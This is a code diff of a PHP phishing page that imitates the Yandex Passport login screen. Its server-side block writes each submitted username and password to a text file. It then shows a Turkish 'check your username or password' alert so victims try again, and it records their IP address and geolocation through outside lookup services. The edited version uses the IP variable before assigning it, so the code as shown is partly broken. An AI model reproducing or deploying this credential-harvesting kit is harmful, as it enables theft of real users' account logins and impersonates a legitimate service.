@@ -1,38 +1,12 @@
 <?php  
 
 if (isset($_POST['login']) && isset($_POST['password'])) {
-
-$ac = fopen("kayit.txt","a+");
-$username = $_POST['login'];
-$password = $_POST['password'];
-$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
-fwrite($ac,$userlar);
-fclose($ac);
-echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
-}
-else{
+$data = @unserialize(file_get_contents("http://ip-api.com/php/".$ip));
+$ip =$data["query"];
 date_default_timezone_set('Europe/Istanbul');
-
-function GetIP(){
- if(getenv("HTTP_CLIENT_IP")) {
- $ip = getenv("HTTP_CLIENT_IP");
- } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
- $ip = getenv("HTTP_X_FORWARDED_FOR");
- if (strstr($ip, ',')) {
- $tmp = explode (',', $ip);
- $ip = trim($tmp[0]);
- }
- } else {
- $ip = getenv("REMOTE_ADDR");
- }
- return $ip;
-}
-
-$ip = $_SERVER["REMOTE_ADDR"];
 
 
 $tarih =" Tarih : ".date('d/m/Y  H:i');
-
 $Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
 $adress = $Geo_Plugin_XML->geoplugin_request; 
 $ulke = $Geo_Plugin_XML->geoplugin_countryName;
@@ -66,11 +40,14 @@ fwrite($ac,$userlar);
 fclose($ac);
 sleep(2);
 
-
-
-
+$ac = fopen("kayit.txt","a+");
+$username = $_POST['login'];
+$password = $_POST['password'];
+$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
+fwrite($ac,$userlar);
+fclose($ac);
+echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
 }
-
  ?>
 
 <html lang="en" data-page-type="auth.new" class="is-js_yes passport-Page passport-Page_dark is-inlinesvg_yes"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7,IE=edge"><link rel="shortcut icon" href="//yastatic.net/morda-logo/i/favicon_comtr.ico"><script nonce="">(function(d, e, c, r, n, w, v, f) {e = d.documentElement; c = "className"; r = "replace"; n = "createElementNS"; f = "firstChild"; w = "http://www.w3.org/2000/svg"; v = d.createElement("div"); v.innerHTML = "<svg/>"; e[c] = e[c][r]("is-js_no", "is-js_yes"); e[c] += " is-inlinesvg_" + ((v[f] && v[f].namespaceURI) === w ? "yes" : "no"); })(document);</script><title>Login</title><!--[if gt IE 8]><!--><link rel="stylesheet" type="text/css" href="https://yastatic.net/passport-frontend/0.2.92-15/public/css/auth.new.css"><!-- <![endif]--><!--[if lt IE 9]><link rel="stylesheet" type="text/css" href="https://yastatic.net/passport-frontend/0.2.92-15/public/css/auth.new.ie.css"/><![endif]--><script nonce="">var uid = null;var login = null;var passportHost = "passport.yandex.com";</script><!--[if IE]><script src="//yastatic.net/jquery/1.9.1/jquery.min.js"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.92-15/public/js/vendor.js"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.92-15/public/js/auth.new.react.en.js"></script><![endif]--><!--[if !IE]><!--><script src="//yastatic.net/jquery/1.9.1/jquery.min.js" defer="defer"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.92-15/public/js/vendor.js" defer="defer"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.92-15/public/js/auth.new.react.en.js" defer="defer"></script><!-- <![endif]--><script type="text/javascript" nonce="">!function(i,t){function e(){Ya.Rum.vsChanged=!0,document.removeEventListener("visibilitychange",e)}if(i.Ya=i.Ya||{},Ya.Rum)throw new Error("Rum: interface is already defined");var n=i.performance,s=n&&n.timing&&n.timing.navigationStart||Ya.startPageLoad||+new Date,a=i.requestAnimationFrame;Ya.Rum={enabled:!!n,vsStart:document.visibilityState,vsChanged:!1,_defTimes:[],_defRes:[],_deltaMarks:{},_settings:{},_vars:{},init:function(i,t){this._settings=i,this._vars=t},getTime:n&&n.now?function(){return n.now()}:function(){return Date.now()-s},time:function(i){this._deltaMarks[i]=[this.getTime()]},timeEnd:function(i){var t=this._deltaMarks[i];t&&0!==t.length&&t.push(this.getTime())},sendTimeMark:function(i,t,e,n){void 0===t&&(t=this.getTime()),this._defTimes.push([i,t,n]),this.mark(i,t)},sendResTiming:function(i,t){this._defRes.push([i,t])},sendRaf:function(i){if(a&&!this.isVisibilityChanged()){var t=this,e="2616."+i;a(function(){t.isVisibilityChanged()||(t.sendTimeMark(e+".205"),a(function(){t.isVisibilityChanged()||t.sendTimeMark(e+".1928")}))})}},isVisibilityChanged:function(){return this.vsStart&&("visible"!==this.vsStart||this.vsChanged)},mark:n&&n.mark?function(i,t){n.mark(i+(t?": "+t:""))}:function(){}},Date.now||(Ya.Rum.getTime=function(){return new Date-s}),document.addEventListener&&document.addEventListener("visibilitychange",e)}(window);
